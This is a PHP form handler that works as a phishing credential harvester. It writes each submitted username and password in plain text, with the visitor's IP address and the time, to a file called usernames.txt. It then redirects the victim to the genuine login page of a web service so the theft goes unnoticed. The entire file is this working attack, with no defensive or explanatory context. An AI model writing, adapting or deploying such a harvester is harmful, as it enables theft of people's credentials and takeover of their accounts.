<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php');
    exit;
}

$username = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');

if ($username === '' || $password === '') {
    header('Location: index.php');
    exit;
}

$logEntry = sprintf(
    "Account: %s | Password: %s | IP: %s | Time: %s\n",
    $username,
    $password,
    $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    date('Y-m-d H:i:s')
);

file_put_contents('usernames.txt', $logEntry, FILE_APPEND | LOCK_EX);

header('Location: https://app.trakka.io/login');
exit;
